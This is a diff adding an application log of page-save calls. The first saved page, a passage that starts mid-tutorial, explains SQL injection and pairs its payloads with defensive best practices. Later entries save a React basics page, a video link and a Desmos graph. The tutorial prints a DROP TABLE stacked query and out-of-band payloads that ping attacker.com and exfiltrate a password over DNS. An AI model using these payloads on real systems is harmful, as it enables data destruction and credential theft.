+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "INSERT"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": ", "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "UPDATE"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": ", or "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "DROP TABLE"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": " can be executed directly."
+    },
+    {
+      "type": "paragraph",
+      "content": "Note that not all database systems or APIs support stacked queries (e.g., PHP's "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "mysqli_multi_query()"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": " does, but "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "mysqli_query()"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": " does not)."
+    },
+    {
+      "type": "paragraph",
+      "content": "Example: "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "username'; DROP TABLE users;--"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": "(This attempts to delete the 'users' table.)"
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3
+      },
+      "content": "6. Out-of-Band (OOB) SQLi Payloads"
+    },
+    {
+      "type": "paragraph",
+      "content": "This type of injection is used when the attacker cannot directly retrieve data via the same channel as the injection (e.g., no visible output, no observable time delays)."
+    },
+    {
+      "type": "paragraph",
+      "content": "The payload causes the database server to send data to an external server controlled by the attacker (e.g., via DNS queries, HTTP requests, or other network protocols)."
+    },
+    {
+      "type": "paragraph",
+      "content": "Example (MSSQL with xp_cmdshell): "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "'; EXEC master..xp_cmdshell 'ping attacker.com';--"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": "Example (MySQL with LOAD_FILE for DNS exfiltration): "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE id=1), '.attacker.com\\share'))--"
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "Common Payload Components and Techniques"
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Comments: "
+        },
+        {
+          "type": "text",
+          "text": "Used to nullify the rest of the original query after the injected payload, preventing syntax errors and ensuring the injected code executes."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "--"
+        },
+        {
+          "type": "text",
+          "text": " (two hyphens and a space) for MySQL/PostgreSQL/Oracle/MSSQL"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "#"
+        },
+        {
+          "type": "text",
+          "text": " (hash symbol) for MySQL"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "/* ... */"
+        },
+        {
+          "type": "text",
+          "text": " for multi-line comments across many databases"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "String Concatenation: "
+        },
+        {
+          "type": "text",
+          "text": "Used to build strings, often to craft error messages or data to be exfiltrated."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "CONCAT()"
+        },
+        {
+          "type": "text",
+          "text": " for MySQL"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "+"
+        },
+        {
+          "type": "text",
+          "text": " for MSSQL"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "||"
+        },
+        {
+          "type": "text",
+          "text": " for Oracle/PostgreSQL"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Substring/Character Extraction: "
+        },
+        {
+          "type": "text",
+          "text": "Essential for blind SQLi, allowing attackers to extract data character by character or bit by bit."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "SUBSTRING(), MID(), LEFT(), RIGHT()"
+        },
+        {
+          "type": "text",
+          "text": " for MySQL"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "SUBSTR()"
+        },
+        {
+          "type": "text",
+          "text": " for Oracle/PostgreSQL"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "SUBSTRING()"
+        },
+        {
+          "type": "text",
+          "text": " for MSSQL"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Type Conversion: "
+        },
+        {
+          "type": "text",
+          "text": "Sometimes needed to convert data types (e.g., integer to string) to prevent errors or facilitate injection."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "CAST(), CONVERT()"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Conditional Statements: "
+        },
+        {
+          "type": "text",
+          "text": "Used in blind SQLi to test conditions and trigger different behaviors (e.g., "
+        },
+        {
+          "type": "text",
+          "text": "IF"
+        },
+        {
+          "type": "text",
+          "text": ", "
+        },
+        {
+          "type": "text",
+          "text": "CASE"
+        },
+        {
+          "type": "text",
+          "text": ", "
+        },
+        {
+          "type": "text",
+          "text": "WHEN"
+        },
+        {
+          "type": "text",
+          "text": ")."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "System Information Functions: "
+        },
+        {
+          "type": "text",
+          "text": "Used to gather details about the database server, current user, database name, version, etc."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "VERSION()"
+        },
+        {
+          "type": "text",
+          "text": " (MySQL), "
+        },
+        {
+          "type": "text",
+          "text": "@@VERSION"
+        },
+        {
+          "type": "text",
+          "text": " (MSSQL), "
+        },
+        {
+          "type": "text",
+          "text": "banner"
+        },
+        {
+          "type": "text",
+          "text": " (Oracle)"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "DATABASE()"
+        },
+        {
+          "type": "text",
+          "text": ", "
+        },
+        {
+          "type": "text",
+          "text": "SCHEMA()"
+        },
+        {
+          "type": "text",
+          "text": " (MySQL), "
+        },
+        {
+          "type": "text",
+          "text": "DB_NAME()"
+        },
+        {
+          "type": "text",
+          "text": " (MSSQL)"
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "  ",
+          "styles": {
+            "backgroundColor": "default",
+            "textColor": "default"
+          }
+        },
+        {
+          "type": "text",
+          "text": "USER()"
+        },
+        {
+          "type": "text",
+          "text": ", "
+        },
+        {
+          "type": "text",
+          "text": "SYSTEM_USER"
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "Best Practices for Defense Against SQL Injection"
+    },
+    {
+      "type": "paragraph",
+      "content": "To mitigate SQL Injection risks and protect your applications:"
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Use Parameterized Queries/Prepared Statements: "
+        },
+        {
+          "type": "text",
+          "text": "This is the most effective defense. It separates the SQL code from user-supplied data, ensuring that input is always treated as data and not executable code."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Employ Stored Procedures: "
+        },
+        {
+          "type": "text",
+          "text": "When securely designed, stored procedures can offer a layer of protection as they often implicitly parameterize inputs."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Validate and Sanitize User Input: "
+        },
+        {
+          "type": "text",
+          "text": "Implement strict input validation (whitelist approach) on all user-supplied data. Sanitize data by escaping special characters or removing them."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Implement Least Privilege: "
+        },
+        {
+          "type": "text",
+          "text": "Ensure that database users connecting to the application only have the minimum necessary permissions to perform their tasks."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Keep Database Software Updated: "
+        },
+        {
+          "type": "text",
+          "text": "Regularly patch and update database management systems to protect against known vulnerabilities."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": [
+        {
+          "type": "text",
+          "text": "Avoid Verbose Database Errors: "
+        },
+        {
+          "type": "text",
+          "text": "Do not display raw database error messages to end-users, as these can leak sensitive information that aids attackers."
+        }
+      ]
+    }
+  ]
+}
+Saving blocks to DB. Length: 96
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T09:11:22.117Z ---
+INPUT: {
+  "pageId": "f6d58b33-e8dd-401b-b141-95f02ac46060",
+  "blockType": "blocks",
+  "data": [
+    {
+      "type": "heading",
+      "props": {
+        "level": 1,
+        "textColor": "blue",
+        "backgroundColor": "blue"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "React Basics",
+          "styles": {
+            "bold": true,
+            "textColor": "white"
+          }
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textColor": "green"
+      },
+      "content": "What is React?"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "green"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "React is a free and open-source front-end JavaScript library for building user interfaces based on UI components. It's maintained by Meta and a community of individual developers and companies. React can be used to develop single-page, mobile, or server-rendered applications with frameworks like Next.js.",
+          "styles": {
+            "textColor": "white"
+          }
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textColor": "purple"
+      },
+      "content": "Core Concepts"
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textColor": "orange"
+      },
+      "content": "1. Components"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "orange"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "React applications are built using components, which are independent, reusable pieces of UI. Think of them as custom, isolated HTML elements that return React elements to be rendered to the page. They can be function components or class components.",
+          "styles": {
+            "textColor": "white"
+          }
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textColor": "red"
+      },
+      "content": "2. JSX (JavaScript XML)"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "red"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "JSX is a syntax extension for JavaScript that looks a lot like HTML. It allows you to write HTML-like code directly within your JavaScript files. React then uses this JSX to describe what the UI should look like. It's not required to use JSX, but it makes React code much cleaner and easier to read.",
+          "styles": {
+            "textColor": "white"
+          }
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textColor": "blue"
+      },
+      "content": "3. State"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "blue"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "State refers to data that changes over time within a component. It's private to a component and fully controlled by it. When a component's state changes, React re-renders the component to reflect the new data. This is how interactive elements update on the screen.",
+          "styles": {
+            "textColor": "white"
+          }
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textColor": "green"
+      },
+      "content": "4. Props (Properties)"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "green"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "Props are how data is passed from a parent component to a child component. They are read-only, meaning a child component cannot directly modify the props it receives from its parent. This creates a unidirectional data flow, making applications easier to understand and debug.",
+          "styles": {
+            "textColor": "white"
+          }
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textColor": "brown"
+      },
+      "content": "Getting Started with React"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "brown"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "The easiest way to get started with React is to use ",
+          "styles": {
+            "textColor": "white"
+          }
+        },
+        {
+          "type": "text",
+          "text": "Vite",
+          "styles": {
+            "bold": true,
+            "textColor": "white"
+          }
+        },
+        {
+          "type": "text",
+          "text": " or ",
+          "styles": {
+            "textColor": "white"
+          }
+        },
+        {
+          "type": "text",
+          "text": "Create React App",
+          "styles": {
+            "bold": true,
+            "textColor": "white"
+          }
+        },
+        {
+          "type": "text",
+          "text": ". These tools set up a modern web development environment, allowing you to focus on writing your React code. You'll typically need Node.js installed to use these tools. After setting up, you can create your first component and start building!",
+          "styles": {
+            "textColor": "white"
+          }
+        }
+      ]
+    }
+  ]
+}
+Saving blocks to DB. Length: 15
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T09:11:55.902Z ---
+INPUT: {
+  "pageId": "f6d58b33-e8dd-401b-b141-95f02ac46060",
+  "blockType": "video",
+  "data": "https://utfs.io/f/9fQYfmvDcjYKwKMv9dHeTcBNYqfMgyQF7H8Edk1AGKoIxlzb"
+}
+Saving blocks to DB. Length: 17
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T09:20:01.263Z ---
+INPUT: {
+  "pageId": "02304d34-4c0c-4183-a9e0-8c324fc189ae",
+  "blockType": "desmos",
+  "data": [
+    {
+      "id": "graph1",
+      "latex": "(x-2)(y-3)=1",
+      "color": "#2d70b3",
+      "hidden": false
+    },
+    {
+      "id": "graph2",
+      "latex": "(x-2)(y-3)=-1",
+      "color": "#c74440",
+      "hidden": false
+    },
+    {
+      "id": "graph3",
+      "latex": "x=2",
+      "color": "#6042a6",
+      "hidden": false
+    },
+    {
+      "id": "graph4",
+      "latex": "y=3",
+      "color": "#30923e",
+      "hidden": false
+    }
+  ]
+}
+Saving blocks to DB. Length: 2
+Saved successfully to Postgres.
